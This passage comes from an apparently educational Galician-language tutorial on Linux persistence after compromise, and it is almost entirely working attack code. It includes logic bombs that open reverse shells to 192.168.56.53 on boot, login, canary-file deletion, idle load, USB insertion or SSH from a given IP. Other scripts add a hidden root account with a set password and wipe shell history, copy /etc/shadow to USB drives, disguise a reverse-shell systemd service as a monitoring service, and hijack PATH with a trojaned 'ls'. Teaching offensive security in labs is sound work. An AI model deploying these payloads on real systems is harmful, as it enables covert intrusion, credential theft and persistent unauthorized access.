+</span><span id="__span-33-25"><a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="s"># Comprobar se chegamos ao obxectivo</span>
+</span><span id="__span-33-26"><a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="s">if [ $COUNT -ge $TRIGGER_COUNT ]; then</span>
+</span><span id="__span-33-27"><a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a><span class="s">    # Lanzar a shell en segundo plano</span>
+</span><span id="__span-33-28"><a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-33-29"><a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="s">fi</span>
+</span><span id="__span-33-30"><a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="s">EOF</span>
+</span><span id="__span-33-31"><a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a>
+</span><span id="__span-33-32"><a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a><span class="c1"># 1. Dar permisos de execución (IMPRESCINDIBLE)</span>
+</span><span id="__span-33-33"><a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/etc/init.d/boot-counter
+</span><span id="__span-33-34"><a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a>
+</span><span id="__span-33-35"><a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="c1"># 2. Habilitar script no arranque</span>
+</span><span id="__span-33-36"><a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a>update-rc.d<span class="w"> </span>boot-counter<span class="w"> </span>defaults
+</span></code></pre></div>
+<p><strong>Variante 5: Eventos do sistema</strong></p>
+<p>Bomba lóxica baseada en eventos: Esta técnica activa código malicioso cando se cumpren certas condicións ou eventos específicos do sistema.</p>
+<p><code>Opción A</code>: Activación ao login dun usuario específico:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /etc/profile.d/user-monitor.sh</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="s"># Activar cando o usuario &quot;admin&quot; faga login</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="s">if [ &quot;$USER&quot; == &quot;admin&quot; ]; then</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="s">fi</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="s"># Ou activar cando o usuario dimitri faga logout</span>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="s">trap &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&quot; &amp;&#39; EXIT</span>
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="s">EOF</span>
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>
+</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/etc/profile.d/user-monitor.sh
+</span></code></pre></div></p>
+<p><code>Opción B</code>: Activación cando se elimina un arquivo "canario":</p>
+<details class="abstract">
+<summary>Arquivo canario 🐤</summary>
+<p>Un <strong>arquivo canario</strong> (canary file) é un ficheiro que se usa como sistema de detección de intrusións ou manipulacións no sistema. É como deixar un "fío trampa" que alerta cando alguén pasa por alí!</p>
+</details>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Crear arquivo canario</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>touch<span class="w"> </span>/tmp/.keepalive
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/canary-check</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="s"># Se o arquivo canario non existe, activar payload</span>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="s">if [ ! -f &quot;/tmp/.keepalive&quot; ]; then</span>
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="s">    # O administrador está a investigar, activar evacuación</span>
+</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="s">    </span>
+</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="s">    # Crear usuario de emerxencia</span>
+</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="s">    useradd -m -o -u 0 emergency 2&gt;/dev/null</span>
+</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="s">    echo &quot;emergency:Emerg123&quot; | chpasswd</span>
+</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="s">    </span>
+</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="s">    # Limpar rastros</span>
+</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="s">    history -c</span>
+</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="s">    &gt; ~/.bash_history</span>
+</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a><span class="s">fi</span>
+</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a><span class="s">EOF</span>
+</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>
+</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/canary-check
+</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/5 * * * * root /usr/local/bin/canary-check&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div>
+<p><code>Opción C</code>: Activación segundo carga do sistema.
+<em>Nota: Usamos <code>LC_ALL=C</code> para evitar erros con decimais/comas.</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/load-trigger</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="s"># Usamos LC_ALL=C para obter a saída en inglés estándar e evitar erros</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="s"># de idioma ou formato numérico.</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="s">LOAD=$(LC_ALL=C uptime | awk -F&#39;load average:&#39; &#39;{print $2}&#39; | awk &#39;{print $2}&#39; | cut -d&#39;,&#39; -f1)</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="s">LOAD_INT=$(echo &quot;$LOAD&quot; | cut -d&#39;.&#39; -f1)</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="s"># Activar se a carga é menor que 1 (máquina inactiva)</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="s">if [ &quot;$LOAD_INT&quot; -lt 1 ]; then</span>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="s">fi</span>
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="s">EOF</span>
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/load-trigger
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/10 * * * * root /usr/local/bin/load-trigger&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div>
+<p><code>Opción D</code>: Activación cando se monta un USB ou dispositivo externo.
+<em>Nota: Usamos <code>lsblk</code> para identificar correctamente o punto de montaxe e evitar erros con /dev/sda.</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /etc/udev/rules.d/99-usb-trigger.rules</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="s"># Regra que se activa ao conectar un USB</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="s">ACTION==&quot;add&quot;, SUBSYSTEM==&quot;usb&quot;, RUN+=&quot;/usr/local/bin/usb-payload&quot;</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="s">EOF</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/usb-payload</span>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="s"># Esperamos uns segundos para dar tempo a que o sistema ou o usuario monte o volume</span>
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="s">sleep 5</span>
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>
+</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="s"># SOLUCIÓN ROBUSTA: Usar lsblk para filtrar só USBs montados</span>
+</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="s">USB_MOUNT=$(lsblk -rpo &quot;TRAN,MOUNTPOINT&quot; | grep &#39;^usb&#39; | awk &#39;$2!=&quot;&quot; {print $2}&#39; | head -1)</span>
+</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>
+</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="s"># Se atopamos un USB montado...</span>
+</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a><span class="s">if [ ! -z &quot;$USB_MOUNT&quot; ]; then</span>
+</span><span id="__span-37-17"><a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a>
+</span><span id="__span-37-18"><a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a><span class="s">    # 1. Rexistrar evento</span>
+</span><span id="__span-37-19"><a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a><span class="s">    echo &quot;$(date): USB device detected at $USB_MOUNT&quot; &gt;&gt; /var/log/usb-events.log</span>
+</span><span id="__span-37-20"><a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a>
+</span><span id="__span-37-21"><a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a><span class="s">    # 2. Copiar datos (Exfiltración)</span>
+</span><span id="__span-37-22"><a id="__codelineno-37-22" name="__codelineno-37-22" href="#__codelineno-37-22"></a><span class="s">    cp /etc/shadow &quot;$USB_MOUNT/.shadow_backup&quot; 2&gt;/dev/null</span>
+</span><span id="__span-37-23"><a id="__codelineno-37-23" name="__codelineno-37-23" href="#__codelineno-37-23"></a><span class="s">    cp /etc/passwd &quot;$USB_MOUNT/.passwd_backup&quot; 2&gt;/dev/null</span>
+</span><span id="__span-37-24"><a id="__codelineno-37-24" name="__codelineno-37-24" href="#__codelineno-37-24"></a>
+</span><span id="__span-37-25"><a id="__codelineno-37-25" name="__codelineno-37-25" href="#__codelineno-37-25"></a><span class="s">    # 3. Activar Reverse Shell (opcional)</span>
+</span><span id="__span-37-26"><a id="__codelineno-37-26" name="__codelineno-37-26" href="#__codelineno-37-26"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/9999 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-37-27"><a id="__codelineno-37-27" name="__codelineno-37-27" href="#__codelineno-37-27"></a><span class="s">fi</span>
+</span><span id="__span-37-28"><a id="__codelineno-37-28" name="__codelineno-37-28" href="#__codelineno-37-28"></a><span class="s">EOF</span>
+</span><span id="__span-37-29"><a id="__codelineno-37-29" name="__codelineno-37-29" href="#__codelineno-37-29"></a>
+</span><span id="__span-37-30"><a id="__codelineno-37-30" name="__codelineno-37-30" href="#__codelineno-37-30"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/usb-payload
+</span><span id="__span-37-31"><a id="__codelineno-37-31" name="__codelineno-37-31" href="#__codelineno-37-31"></a>udevadm<span class="w"> </span>control<span class="w"> </span>--reload-rules
+</span></code></pre></div>
+<p><code>Opción E</code>: Activación ao detectar conexión SSH de IP específica:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/ssh-monitor</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="s"># Monitorizar conexións SSH</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="s">SUSPICIOUS_IP=&quot;192.168.56.100&quot;</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="s"># Revisar últimas conexións SSH</span>
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="s">if grep -q &quot;$SUSPICIOUS_IP&quot; /var/log/auth.log; then</span>
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="s">fi</span>
+</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="s">EOF</span>
+</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>
+</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/ssh-monitor
+</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/2 * * * * root /usr/local/bin/ssh-monitor&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<p><code>Opción F</code>: Activación cando un proceso específico non se está executando:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /usr/local/bin/process-trigger</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="s"># Verificar se o proceso de monitorización está activo</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="s">if ! pgrep -x &quot;monitoring_daemon&quot; &gt; /dev/null; then</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="s">    bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/5555 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="s">fi</span>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="s">EOF</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/process-trigger
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*/3 * * * * root /usr/local/bin/process-trigger&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</span></code></pre></div></p>
+<hr />
+<h3 id="opcion-7-backdoor-en-servizo-systemd">Opción 7 - Backdoor en servizo systemd</h3>
+<p>Esta técnica crea un <code>servizo systemd</code> personalizado que establece unha reverse shell ao inicio do sistema, mantendo persistencia despois de cada reinicio.</p>
+<p>Na máquina Kali Linux, deixar un listener á escoita:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">6666</span>
+</span></code></pre></div></p>
+<p>Na máquina comprometida, como <code>root</code>, crear un ficheiro de <code>servizo systemd</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /etc/systemd/system/system-monitor.service</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="s">[Unit]</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="s">Description=System Monitoring Service</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="s">After=network.target</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="s">[Service]</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="s">Type=simple</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="s">User=root</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="s">ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/6666 0&gt;&amp;1&#39;</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="s">Restart=on-failure</span>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="s">RestartSec=30</span>
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>
+</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="s">[Install]</span>
+</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="s">WantedBy=multi-user.target</span>
+</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="s">EOF</span>
+</span></code></pre></div></p>
+<p>Habilitar e iniciar o servizo:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>systemctl<span class="w"> </span>daemon-reload
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>system-monitor.service
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>systemctl<span class="w"> </span>start<span class="w"> </span>system-monitor.service
+</span></code></pre></div></p>
+<p>Verificar o estado do servizo:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>systemctl<span class="w"> </span>status<span class="w"> </span>system-monitor.service
+</span></code></pre></div></p>
+<p>Agora, cada vez que se inicie o sistema, o servizo systemd executarase automaticamente e establecerá a reverse shell. A vantaxe desta técnica é que:</p>
+<ul>
+<li>Execútase automaticamente ao inicio do sistema</li>
+<li>Reinténtase cada 30 segundos se falla a conexión</li>
+<li>Aparece como un servizo lexítimo do sistema</li>
+<li>Persiste a través de reinicios</li>
+</ul>
+<hr />
+<h2 id="5-bloque-iv-persistencia-en-binarios-e-entorno">5. Bloque IV: Persistencia en Binarios e Entorno</h2>
+<h3 id="opcion-8-modificacion-do-path">Opción 8 - Modificación do PATH</h3>
+<p>Esta técnica modifica a variable de entorno <code>PATH</code> para que o sistema execute binarios maliciosos en lugar dos lexítimos, establecendo persistencia de forma discreta.</p>
+<p>Na máquina Kali Linux, deixar un listener:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">7777</span>
+</span></code></pre></div></p>
+<p>Primeiro, na máquina comprometida, como <code>root</code>, crear un directorio para os nosos binarios maliciosos:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/opt/.hidden
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/opt/.hidden
+</span></code></pre></div></p>
+<p><strong>OPCIÓN A:</strong>
+Crear un binario malicioso que suplante un comando común como <code>ls</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /opt/.hidden/ls</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="s">bash -i &gt;&amp; /dev/tcp/192.168.56.53/7777 0&gt;&amp;1 &amp;</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="s">/bin/ls &quot;$@&quot;</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="s">EOF</span>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/opt/.hidden/ls
+</span></code></pre></div></p>
+<p>Modificar o <code>PATH</code> global para que se consulte primeiro o noso directorio:</p>
+<p><strong>Variante 1</strong>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export PATH=/opt/.hidden:$PATH&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/profile
+</span></code></pre></div></p>
+<p><strong>Variante 2</strong>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export PATH=/opt/.hidden:$PATH&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/bash.bashrc
+</span></code></pre></div></p>
+<p><strong>OPCIÓN B:</strong>
+Crear outros binarios maliciosos para comandos frecuentes:
